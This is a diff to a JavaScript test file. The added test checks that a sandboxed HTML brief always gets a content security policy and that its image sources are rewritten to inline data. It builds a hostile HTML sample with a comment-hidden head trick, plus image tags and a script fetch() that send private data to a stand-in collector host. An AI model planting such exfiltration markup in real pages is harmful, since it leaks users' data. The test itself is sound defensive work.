@@ -5,14 +5,17 @@ import { gzipSync } from "node:zlib";
 
 import {
   FINANCE_HUB_TIER,
+  GOODBRIEF_SRCDOC_CSP,
   evaluateFinanceHubAccess,
   evaluateValidatorFinanceHubState,
+  prepareGoodbriefSrcDoc,
 } from "../server/finance-hub-access.js";
 import { createValidatorBundleHandler } from "../server/validator-bundles.js";
 import { BUNDLE_FILE_FORMAT } from "../server/validator-bundle-files.js";
 import { createFinanceHubRoutesHandler } from "../server/finance-hub-routes.js";
 import { libraryRestrictionsFromFiles } from "../server/finance-hub-library.js";
 import { sha256Hex, signPublishPayload, verifySignedPublishRequest } from "../server/finance-hub-publish.js";
+import { buildGoodbriefSrcDoc } from "../src/features/research/goodbrief-sandbox.js";
 
 async function invokeHandler(handler, { method = "GET", pathname, session = null, body = null, headers = {} }) {
   const response = { status: null, headers: {}, body: null };
@@ -322,4 +325,44 @@ test("(g) public publications are decoded before the leak scan and their JSON mu
   assert.deepEqual(gated.decodedFiles[0].bytes, html);
   const corrupt = await verify("goodbrief", [file("index.html", Buffer.from("not gzip"), "gzip", "text/html")]);
   assert.equal(corrupt.error, "file_encoding_invalid");
+});
+
+// ============================================================================
+// (h) The sandboxed brief always has its content policy (review 447-06)
+// ============================================================================
+
+test("(h) the Goodbrief policy sits in a code-built head even when the untrusted HTML comments out a <head>", async () => {
+  const { parse } = await import("parse5");
+  const hostile = '<!-- <head> --><html><head></head><body><img src="https://example.invalid/collector?private=BRIEF">'
+    + '<img srcset="https://example.invalid/a.png 2x"><img src="data:image/png;base64,AAAA">'
+    + '<script>fetch("https://example.invalid/collector?private=BRIEF",{mode:"no-cors"})</script></body></html>';
+  const walk = (node, out = []) => { out.push(node); for (const child of node.childNodes || []) walk(child, out); return out; };
+  const attr = (node, name) => (node.attrs || []).find((a) => a.name === name)?.value;
+  const isCsp = (node) => node.tagName === "meta" && attr(node, "http-equiv") === "Content-Security-Policy";
+  const docs = {
+    server: prepareGoodbriefSrcDoc(hostile, { watermarkId: "fh-test" }),
+    client: buildGoodbriefSrcDoc(hostile, { watermarkId: "fh-test" }),
+  };
+  docs.both = buildGoodbriefSrcDoc(docs.server, { watermarkId: "fh-test" });
+  for (const [name, doc] of Object.entries(docs)) {
+    const tree = parse(doc);
+    const html = tree.childNodes.find((node) => node.tagName === "html");
+    const head = html.childNodes.find((node) => node.tagName === "head");
+    const body = html.childNodes.find((node) => node.tagName === "body");
+    const headElements = head.childNodes.filter((node) => node.tagName);
+    assert.equal(headElements[0].tagName, "meta", `${name}: charset first`);
+    assert.ok(isCsp(headElements[1]), `${name}: the policy is the head's second element`);
+    assert.equal(attr(headElements[1], "content"), GOODBRIEF_SRCDOC_CSP);
+    assert.equal(headElements.filter(isCsp).length, 1, `${name}: one policy in the head`);
+    assert.ok(GOODBRIEF_SRCDOC_CSP.includes("base-uri 'none'"));
+    const images = walk(body).filter((node) => node.tagName === "img");
+    assert.equal(images.length, 3);
+    for (const img of images) {
+      for (const key of ["src", "srcset"]) {
+        const value = attr(img, key);
+        assert.ok(value === undefined || value.startsWith("data:"), `${name}: ${key}=${value} must be inline data`);
+      }
+    }
+    assert.equal(walk(tree).some((node) => node.nodeName === "#comment" && node.data.includes("Content-Security-Policy")), false);
+  }
 });
